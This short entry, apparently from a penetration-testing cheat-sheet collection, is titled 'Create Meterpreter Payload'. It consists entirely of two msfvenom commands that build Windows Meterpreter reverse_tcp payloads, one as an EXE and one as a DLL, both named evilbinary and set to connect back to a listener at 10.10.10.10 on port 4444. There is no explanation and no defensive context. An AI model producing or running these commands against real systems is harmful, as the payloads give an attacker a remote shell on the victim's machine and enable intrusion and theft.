---
id: ee318960-f0e9-42c3-bf85-be8ff693561e
name: Create Meterpreter Payload
type: command
executor: bash
data: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f
  exe > evilbinary.exe

  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll
  > evilbinary.dll'
output: null
created_at: '2023-04-06T03:56:28.015358+00:00'
updated_at: '2023-04-10T20:37:21.623497+00:00'
---

# Create Meterpreter Payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > evilbinary.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evilbinary.dll
```


